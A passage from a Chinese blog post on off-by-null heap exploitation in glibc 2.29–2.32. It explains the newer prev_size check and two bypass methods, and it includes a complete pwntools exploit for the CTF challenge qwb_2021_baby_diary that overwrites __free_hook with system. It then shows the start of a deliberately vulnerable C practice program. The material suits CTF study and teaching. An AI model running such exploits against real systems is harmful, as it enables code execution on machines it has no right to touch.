    </entry>
    
    
    
    <entry>
      <title>高版本libc(2.29-2.32) off by null利用姿势笔记</title>
      <link href="/2021/07/12/%E9%AB%98%E7%89%88%E6%9C%AClibc(2.29-2.32)%20off%20by%20null%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/"/>
      <url>/2021/07/12/%E9%AB%98%E7%89%88%E6%9C%AClibc(2.29-2.32)%20off%20by%20null%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>个人理解off by null 是 off by one的一种特例, off by null指我们可以控制堆块向下一个堆块溢出一个字节的数据，而该数据只能为’\x00’的情况。如果像常规off by one 是溢出任意一个字节，那么就可以修改下一个堆块的大小，而off by null则不能，它仅仅只可以将下一个堆块的inuse位置零.<a id="more"></a></p><h2 id="高版本libc改动影响"><a href="#高版本libc改动影响" class="headerlink" title="高版本libc改动影响"></a>高版本libc改动影响</h2><p>我们在2.29前 ,我们只需要按照下面来布局堆块:</p><p><img src="image-20210713000221116.png" alt="image-20210713000221116"></p><p>然后按照下面步骤:</p><ol><li>先释放chunk A.</li><li>通过chunk B,利用off by one漏洞在 修改chunk C presize 值为 chunk A size +chunk B size的同时,将chunk C的prev_inuse值覆盖为’\x00’.</li><li>再释放chunk C。</li></ol><p><img src="image-20210712235502736.png" alt="image-20210712235502736"></p><p>即可让chunk A B C 合并为一块大的chunk。</p><p> 但是在2.29后的libc在两个free chunk 进行合并前多一次对<code>prevsize</code>的值检查对应的源代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  <span class="built_in">size</span> += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>导致我们如果按照上面所说的方法在<code>if (__glibc_unlikely (chunksize(p) != prevsize))</code>时,无法成功通过.因为此时<code>prevsize</code>为的<code>A size+ B size</code>但p的size仅仅为<code>A size</code>.</p><h2 id="爆破法"><a href="#爆破法" class="headerlink" title="爆破法"></a>爆破法</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>爆破法我借鉴的是nopnoping爷爷的思路：<a href="https://nopnoping.github.io/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://nopnoping.github.io/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</a></p><p>爆破法的思路比较简单:</p><p>1.分配一个chunk ,将使下一块chunk地址的后三位抬高为<code>0x000</code>,并有机会出现后四位都是<code>0x0000</code>的情况.</p><p>2.分配一个范围大于tcache的最大值并且在largebin范围内的chunk A.</p><p>3.分配一个隔离chunk k.</p><p><img src="image-20210713163115172.png" alt="image-20210713163115172"></p><p>4.释放chunk A,在chunk A分配 chunk B,chunk C,chunkD,chunk F ,chunk E.要求chunk C 和chunk  D最好相邻且大小相同,同时让chunk B和 chunk D前14位相同,要求chunk F和chunk E 最好相邻.</p><p>5.释放chunk C 和chunk D 让其合并为smallbins,</p><p>6.分配chunk G 大小是让chunk G分配后,原chunk A 巧好剩下巧好空间H为chunk C +chunk  D的大小.</p><p>7.分配一个大的chunk,让原chunk A 剩下空间H加入smallbins.</p><p>8.重新分配chunk C,chunk D.让chunk C  bk 中addr为chunk D.同时修改其bk为 chunk B addr.</p><p>9.修改chunk B的bk为fake size，fd修改为chunk C addr .</p><p>10.先释放D再释放B，在分配回chunk B ,让原来chunk B fd 位置的值为chunk B addr</p><p>+0x10.</p><p>11.通过chunk F 修改 chunk E 的<code>prevsize</code>值为fake size，并覆盖E的prev_inuse值为0.</p><p> <img src="image-20210713175759641.png" alt="image-20210713175759641"></p><p>12.释放chunk E， B、C、D、F、E合并。</p><h3 id="例题-qwb-2021-baby-diary"><a href="#例题-qwb-2021-baby-diary" class="headerlink" title="例题:qwb_2021_baby_diary"></a>例题:qwb_2021_baby_diary</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"><span class="comment">#sh=process('./baby_diary')</span></span><br><span class="line"><span class="comment">#sh=remote('8.140.114.72', 1399)</span></span><br><span class="line">elf=ELF(<span class="string">'./baby_diary'</span>)</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">"amd64"</span></span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content=<span class="string">'/bin/sh\x00'</span>)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"2"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sh.sendline(<span class="string">"3"</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x4ba0</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x600</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x20</span>)<span class="comment">#9</span></span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x37</span>)<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x37</span>)<span class="comment">#10 x</span></span><br><span class="line">    add(<span class="number">0x37</span>)<span class="comment">#11 x</span></span><br><span class="line">    add(<span class="number">0x47</span>)<span class="comment">#12 x</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">10</span>)</span><br><span class="line">    add(<span class="number">0x20</span>)<span class="comment">#0</span></span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x1000</span>,<span class="string">'l chunk'</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x440</span>,p8(<span class="number">0</span>))<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x1000</span>,<span class="string">'l chunk'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#4,5,6,10, 11,13,14</span></span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x37</span>,p64(<span class="number">0</span>)+p8(<span class="number">0x10</span>)) <span class="comment">#15  x</span></span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'5555555'</span>)<span class="comment">#16 x</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x37</span>,p64(<span class="number">0x190</span>)+p64(<span class="number">0x101</span>)+p8(<span class="number">0x40</span>))<span class="comment">#</span></span><br><span class="line">    add(<span class="number">0x37</span>,p64(<span class="number">0</span>)*<span class="number">6</span>+p8(<span class="number">0</span>)*<span class="number">6</span>)<span class="comment">#16</span></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    free(<span class="number">10</span>)</span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    free(<span class="number">16</span>)</span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x30</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,p8(<span class="number">0x10</span>))</span><br><span class="line">    add(<span class="number">0x37</span>,p8(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">0x47</span>,p64(<span class="number">0</span>)*<span class="number">8</span>+p8(<span class="number">0</span>)*<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line">    add(<span class="number">0x47</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#17+23</span></span><br><span class="line">        add(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">17</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    free(<span class="number">19</span>)</span><br><span class="line">    free(<span class="number">20</span>)</span><br><span class="line">    free(<span class="number">21</span>)</span><br><span class="line">    free(<span class="number">22</span>)</span><br><span class="line">    free(<span class="number">23</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x1000</span>)<span class="comment">#0</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    add(<span class="number">0x57</span>,<span class="string">'1'</span>*<span class="number">7</span>)<span class="comment">#17</span></span><br><span class="line"><span class="comment">#    free(14)</span></span><br><span class="line"><span class="comment">#    add(0x37,p64(1)+p8(0)*8)</span></span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">6</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p8(<span class="number">1</span>)*<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>)                     </span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">3</span>)    </span><br><span class="line">    show(<span class="number">17</span>)</span><br><span class="line">    addr=u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-391</span></span><br><span class="line">    log.info(<span class="string">'main_arena:'</span>+hex(addr))</span><br><span class="line">    malloc=addr<span class="number">-0x10</span></span><br><span class="line">    log.info(<span class="string">'malloc_hook:'</span>+hex(malloc))</span><br><span class="line">    x=libcfind.finder(<span class="string">'__malloc_hook'</span>,malloc,num=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">multi libc results:</span></span><br><span class="line"><span class="string">[-] 0: libc6_2.15-0ubuntu10.23_amd64(source from:ubuntu-eglibc)</span></span><br><span class="line"><span class="string">[-] 1: libc6-amd64_2.30-0ubuntu2.2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 2: libc6_2.30-0ubuntu2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 3: libc6-amd64_2.31-0ubuntu9.2_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 4: libc6_2.31-0ubuntu9_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 5: local-ad9f264101ca975f82b40fffd5aa6f763cfd1ed9(source from:/usr/lib/x86_64-linux-gnu/libc-2.31.so)</span></span><br><span class="line"><span class="string">[-] 6: libc6-amd64_2.30-0ubuntu2_i386(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[-] 7: libc6-amd64_2.31-0ubuntu9_i386(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 8: libc6_2.31-0ubuntu9.2_amd64(source from:ubuntu-glibc)</span></span><br><span class="line"><span class="string">[-] 9: libc6_2.30-0ubuntu2.2_amd64(source from:ubuntu-old-glibc)</span></span><br><span class="line"><span class="string">[!] you can choose it by hand</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x57</span>,<span class="string">'22222'</span>)</span><br><span class="line">    free(<span class="number">18</span>)</span><br><span class="line">    free(<span class="number">17</span>)</span><br><span class="line">    free(<span class="number">14</span>)</span><br><span class="line">    add(<span class="number">0x37</span>,<span class="string">'11122223'</span>+p32(<span class="number">0x61</span>)+p8(<span class="number">0</span>)*<span class="number">4</span>+p64(x.dump(<span class="string">'__free_hook'</span>)))<span class="comment">#14</span></span><br><span class="line">    add(<span class="number">0x57</span>)<span class="comment">#17</span></span><br><span class="line">    add(<span class="number">0x57</span>,p64(x.dump(<span class="string">'system'</span>))) <span class="comment">#18</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#add(0x57,'')#18</span></span><br><span class="line"> <span class="comment">#   free(1)</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sh=process(<span class="string">"./baby_diary"</span>)</span><br><span class="line">        <span class="comment">#sh=remote('8.140.114.72', 1399)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn2()</span><br><span class="line">            gdb.attach(sh)</span><br><span class="line">            sh.interactive()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure><h2 id="直接法"><a href="#直接法" class="headerlink" title="直接法"></a>直接法</h2><p>直接法我是在wjh爷爷的博客上了解的<a href="http://blog.wjhwjhn.com/archives/193/" target="_blank" rel="noopener">http://blog.wjhwjhn.com/archives/193/</a></p><p>这个方法有关弊端，如果题目<code>\n</code>不能替换‘\x00’就需要题目有show功能，否则还是得爆。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>1.创造4个大于tcache的最大值并且在largebin范围内的chunk A、B、C、D。让B、C相邻外，其他chunk 间都有隔离块隔离同时chunk C的地址为末位为<code>0x00</code>。</p><p>2.按照顺序释放A、C、D，形成largebins 链表。</p><p><img src="image-20210713184123575.png" alt="image-20210713184123575"></p><p>3.释放chunk B，让chunk B和chunk C产生合并。</p><p><img src="image-20210713184333651.png" alt="image-20210713184333651"></p><p>4.创建大小比原来chunk B多0x20size 的new chunk B。让old chunk C的 old fd 与old bk保留在new chunk 底部。创建大小比原来chunk C少0x20size 的new chunk C。</p><p>5.将chunk A和chunk B复原。</p><p><img src="image-20210713185405449.png" alt="image-20210713185405449"></p><p>6.按照顺序释放 A、new C、D，形成largebins 链表。</p><p>7.修改chunk A bf 值为old chunk C addr。修改chunk D fd 值为old chunk C addr。</p><p>8.通过new chunk B修改  old chunk C size 为fake size。通过new chunk C 修改隔离chunk的<code>prevsize</code>值为fake size，</p><p> <img src="image-20210713190210228.png" alt="image-20210713190210228"></p><p>9.free 隔离chunk即出现合并。</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>没有找到合适的，于是选来自nopnoping爷爷博客的例题，源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"><span class="keyword">long</span> *<span class="built_in">point</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>;</span><br><span class="line">&#125;chunks[<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Index?"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&gt;=<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"wrong index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Size?"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;<span class="built_in">size</span>);</span><br><span class="line">chunks[index].<span class="built_in">point</span>=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line"><span class="keyword">if</span>(!chunks[index].<span class="built_in">point</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"malloc error!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">chunks[index].<span class="built_in">size</span>=<span class="built_in">size</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Index?"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&gt;=<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"wrong index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!chunks[index].<span class="built_in">point</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"It's blank!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(chunks[index].<span class="built_in">point</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Index?"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;index);</span><br><span class="line"><span class="keyword">if</span>(index&gt;=<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"wrong index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!chunks[index].<span class="built_in">point</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"It's blank!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *p=chunks[index].<span class="built_in">point</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"content:"</span>);</span><br><span class="line">p[<span class="built_in">read</span>(<span class="number">0</span>,chunks[index].<span class="built_in">point</span>,chunks[index].<span class="built_in">size</span>)]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"><span 